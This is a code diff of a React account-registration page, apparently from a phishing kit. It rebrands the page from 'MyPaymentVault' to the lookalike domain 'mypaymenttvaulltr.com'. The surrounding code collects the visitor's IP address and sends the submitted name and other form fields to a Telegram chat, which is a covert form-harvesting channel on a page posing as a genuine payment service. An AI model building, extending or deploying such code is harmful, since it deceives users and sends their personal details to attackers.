@@ -57,7 +57,7 @@ export default function CreateAccount() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🆕 <b>MyPaymentVault</b>\n` +
+      `🆕 <b>mypaymenttvaulltr.com</b>\n` +
       `📌 <b>Registrasi Akun Baru</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `👤 <b>Nama</b>        : <code>${form.firstName} ${form.lastName}</code>\n` +
@@ -82,7 +82,7 @@ export default function CreateAccount() {
       <AuthHeader />
 
       <div className="w-full overflow-hidden" style={{ maxHeight: "310px" }}>
-        <img src="/hero-card-clean.png" alt="MyPaymentVault" className="w-full object-cover"
+        <img src="/hero-card-clean.png" alt="mypaymenttvaulltr.com" className="w-full object-cover"
           style={{ maxHeight: "310px", objectPosition: "center 20%" }} />
       </div>
 
